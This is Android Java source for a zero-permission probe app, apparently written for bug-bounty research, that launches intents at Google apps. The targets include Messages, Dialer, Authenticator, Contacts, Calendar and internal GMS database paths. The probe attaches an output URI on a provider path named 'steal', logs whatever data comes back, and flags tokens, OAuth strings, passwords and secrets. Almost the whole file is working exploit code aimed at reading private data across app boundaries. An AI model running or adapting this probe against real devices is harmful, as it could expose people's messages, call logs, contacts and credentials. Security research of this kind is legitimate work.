package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class DeepLinkProbeActivity extends Activity {
    private static final String T = "DEEPLINK";
    private int probeIndex = 0;

    private static final Object[][] PROBES = {
        // {request_code, description, intent}
        // --- Messages ---
        {"Messages_ViewConversation", "com.google.android.apps.messaging",
         ".ui.conversation.LaunchConversationActivity", "android.intent.action.VIEW",
         "content://mms-sms/conversations", null},
        {"Messages_SendTo", "com.google.android.apps.messaging",
         ".ui.conversation.LaunchConversationActivity", "android.intent.action.SENDTO",
         "sms:", null},
        {"Messages_ViewSms", "com.google.android.apps.messaging",
         ".ui.conversation.LaunchConversationActivity", "android.intent.action.VIEW",
         "content://sms", null},

        // --- Dialer ---
        {"Dialer_ViewCallLog", "com.google.android.dialer",
         "com.android.dialer.main.impl.MainActivity", "android.intent.action.VIEW",
         "content://call_log/calls", "vnd.android.cursor.dir/calls"},
        {"Dialer_DialContact", "com.google.android.dialer",
         "com.android.dialer.calloptions.ui.CallOptionsActivity", "android.intent.action.DIAL",
         "content://contacts/people/1", null},

        // --- Google Files ---
        {"Files_ViewFile", "com.google.android.apps.nbu.files",
         null, "android.intent.action.VIEW",
         "content://media/external/file", null},

        // --- Google Wallet ---
        {"Wallet_Main", "com.google.android.apps.walletnfcrel",
         null, "android.intent.action.VIEW",
         "https://pay.google.com/gp/v/home", null},

        // --- Google Maps OAuth redirect ---
        {"Maps_SpotifyAuth", "com.google.android.apps.maps",
         "com.spotify.sdk.android.authentication.AuthCallbackActivity",
         "android.intent.action.VIEW", "://callback", null},

        // --- Google Keep ---
        {"Keep_ViewNote", "com.google.android.keep",
         null, "android.intent.action.VIEW",
         "https://keep.google.com/#NOTE/test", null},

        // --- Private Compute Services network usage ---
        {"PCS_NetworkUsage", "com.google.android.apps.miphone.astrea",
         "com.google.android.apps.miphone.astrea.networkusage.ui.user.NetworkUsageLogActivity",
         "android.intent.action.VIEW", null, null},
        {"PCS_NetworkDetails", "com.google.android.apps.miphone.astrea",
         "com.google.android.apps.miphone.astrea.networkusage.ui.user.NetworkUsageItemDetailsActivity",
         "android.intent.action.VIEW", null, null},

        // --- GMS Backup Settings ---
        {"GMS_BackupSettings", "com.google.android.gms",
         "com.google.android.gms.backup.component.BackupSettingsActivity",
         "android.intent.action.VIEW", null, null},

        // --- Google Duo ---
        {"Duo_Call", "com.google.android.apps.tachyon",
         null, "android.intent.action.VIEW",
         "https://duo.google.com/call/test", null},

        // --- Android Device Manager ---
        {"ADM_FindDevice", "com.google.android.apps.adm",
         null, "android.intent.action.VIEW",
         "https://www.google.com/android/find", null},

        // --- Test file:// URI access through various apps ---
        {"Files_InternalFiles", "com.google.android.apps.nbu.files",
         null, "android.intent.action.VIEW",
         "file:///data/data/com.google.android.gms/databases/", null},

        // --- Google Authenticator ---
        {"Auth_OtpAuth", "com.google.android.apps.authenticator2",
         null, "android.intent.action.VIEW",
         "otpauth://totp/test?secret=JBSWY3DPEHPK3PXP&issuer=Test", null},

        // --- Google Contacts ---
        {"Contacts_ViewContact", "com.google.android.contacts",
         null, "android.intent.action.VIEW",
         "content://contacts/people/1", null},

        // --- Google Calendar ---
        {"Calendar_ViewEvent", "com.google.android.calendar",
         null, "android.intent.action.VIEW",
         "content://com.android.calendar/events/1", null},
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Deep Link & Activity Result Probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());
        Log.w(T, "ZERO PERMISSIONS — " + PROBES.length + " probes");
        launchNextProbe();
    }

    private void launchNextProbe() {
        if (probeIndex >= PROBES.length) {
            Log.w(T, "=== ALL PROBES COMPLETE ===");
            return;
        }

        String label = (String) PROBES[probeIndex][0];
        String pkg = (String) PROBES[probeIndex][1];
        String cls = (String) PROBES[probeIndex][2];
        String action = (String) PROBES[probeIndex][3];
        String dataUri = (String) PROBES[probeIndex][4];
        String type = (String) PROBES[probeIndex][5];
        int reqCode = probeIndex + 1;
        probeIndex++;

        Log.w(T, "--- [" + probeIndex + "/" + PROBES.length + "] " + label + " ---");

        try {
            Intent intent = new Intent(action);
            if (dataUri != null) {
                if (type != null) {
                    intent.setDataAndType(Uri.parse(dataUri), type);
                } else {
                    intent.setData(Uri.parse(dataUri));
                }
            }
            if (cls != null) {
                if (cls.startsWith(".")) {
                    intent.setComponent(new ComponentName(pkg, pkg + cls));
                } else {
                    intent.setComponent(new ComponentName(pkg, cls));
                }
            } else {
                intent.setPackage(pkg);
            }
            intent.addCategory("android.intent.category.DEFAULT");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            // Also add common extras that might trigger data return
            intent.putExtra("return_data", true);
            intent.putExtra("EXTRA_OUTPUT", Uri.parse("content://com.vrp.zeroperm.provider/steal"));

            startActivityForResult(intent, reqCode);
            Log.w(T, "  Launched: " + label);

            // Auto-advance after timeout
            getWindow().getDecorView().postDelayed(new Runnable() {
                public void run() {
                    Log.w(T, "  Timeout: " + label);
                    launchNextProbe();
                }
            }, 3000);

        } catch (SecurityException se) {
            Log.w(T, "  SECURITY: " + label + " — " + trunc(se.getMessage(), 100));
            launchNextProbe();
        } catch (Exception e) {
            Log.w(T, "  ERROR: " + label + " — " + e.getClass().getSimpleName() + ": " + trunc(e.getMessage(), 80));
            launchNextProbe();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        String label = "?";
        if (requestCode >= 1 && requestCode <= PROBES.length) {
            label = (String) PROBES[requestCode - 1][0];
        }

        Log.w(T, "[RESULT] " + label + " code=" + requestCode + " result=" + resultCode);

        if (data != null) {
            Log.w(T, "[!!!] DATA RETURNED from " + label);
            if (data.getData() != null) {
                Log.w(T, "  [!!!] URI: " + data.getData().toString());
            }
            if (data.getExtras() != null) {
                Bundle extras = data.getExtras();
                Log.w(T, "  [!!!] EXTRAS keys=" + extras.keySet());
                for (String key : extras.keySet()) {
                    Object val = extras.get(key);
                    if (val != null) {
                        String valStr = val.toString();
                        Log.w(T, "  [!!!] " + key + "=" + trunc(valStr, 200));
                        if (valStr.contains("@") || valStr.contains("token") || valStr.contains("ya29.") ||
                            valStr.contains("content://") || valStr.contains("file://") || valStr.contains("key") ||
                            valStr.contains("password") || valStr.contains("secret")) {
                            Log.w(T, "  [!!!] SENSITIVE DATA: " + key + "=" + trunc(valStr, 300));
                        }
                    }
                }
            }
            if (data.getClipData() != null) {
                Log.w(T, "  [!!!] CLIP DATA: " + data.getClipData().toString());
                for (int i = 0; i < data.getClipData().getItemCount(); i++) {
                    Log.w(T, "  [!!!] CLIP[" + i + "]: " + data.getClipData().getItemAt(i).toString());
                }
            }
        }
    }

    private String trunc(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }
}
